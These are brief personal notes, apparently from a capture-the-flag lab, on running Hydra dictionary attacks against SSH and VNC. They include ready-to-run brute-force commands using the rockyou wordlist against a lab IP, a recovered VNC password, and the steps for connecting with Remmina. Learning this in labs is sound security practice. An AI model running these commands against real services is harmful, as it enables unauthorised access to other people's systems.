 Ex :- Hydra -l username -P wordlist.txt server service   
  - Server will be IP address | Service indicate in which you are trying to launch dictionary attack
  - if username available provide it
  
 Ex :- hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP
 
 
 
 
 
Connecting VNC Server :-
 - Application -> Internet -> Remmina -> VNC -> IP -> Password :- 1q2w3e4r
 
 


Practical :- 
 - hydra -P /usr/share/wordlists/rockyou.txt -f vnc://10.10.9.190 -o hydraresult.txt -t 64 -I 
 - Application -> Internet -> Remmina -> VNC -> IP ->
